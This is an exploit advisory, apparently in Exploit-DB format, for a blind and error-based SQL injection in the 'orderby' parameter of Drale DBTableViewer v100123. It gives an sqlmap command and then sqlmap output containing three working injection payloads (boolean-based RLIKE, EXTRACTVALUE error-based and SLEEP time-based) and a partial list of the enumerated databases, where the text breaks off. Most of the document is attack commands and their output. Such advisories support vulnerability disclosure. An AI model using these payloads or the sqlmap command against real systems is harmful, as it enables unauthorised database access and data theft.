@@ -1,0 +1,52 @@
+Drale DBTableViewer v100123 - Blind SQL Injection
+
+# Exploit Title: drale DBTableViewer - SQL Injection(Blind/Error Base)
+# Date: 2016-06-08
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: http://drale.com/
+# Software Link: https://github.com/drale/DBTableViewer/archive/master.zip
+# Version: Drale DBTableViewer v100123
+# Tested on: Debian [wheezy]
+# CVE : none
+
+### VULNERABILITY
+"orderby" parameter in DBTableViewer is vulnerable.
+This parameter can be performed using blind injection.
+
+### SQLMAP QUERY
+#> sqlm -u "http://127.0.0.1/vul_test/DBTableViewer/?orderby=nice_name&sort=DESC" --level 4 --risk 3 --dbms=mysql
+
+### SQLMAP OUTPUT
+sqlmap identified the following injection points with a total of 727 HTTP(s) requests:
+---
+Parameter: orderby (GET)
+    Type: boolean-based blind
+    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
+    Payload: orderby=nice_name RLIKE (SELECT (CASE WHEN (1697=1697) THEN 0x6e6963655f6e616d65 ELSE 0x28 END))&sort=DESC
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)
+    Payload: orderby=nice_name AND EXTRACTVALUE(6590,CONCAT(0x5c,0x7162766a71,(SELECT (CASE WHEN (6590=6590) THEN 1 ELSE 0 END)),0x71787a7671))&sort=DESC
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0 time-based blind - Parameter replace
+    Payload: orderby=(SELECT (CASE WHEN (6082=6082) THEN SLEEP(5) ELSE 6082*(SELECT 6082 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&sort=DESC
+---
+[12:03:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL 5.1
+....
+
+[12:07:33] [INFO] retrieved: zoph
+[12:07:33] [INFO] retrieved: zzzz
+available databases [25]:
+[*] "
+[*] ""
+[*] '
+[*] ''
+[*] '''
+[*] api
+[*] blackcat
+[*] edusec
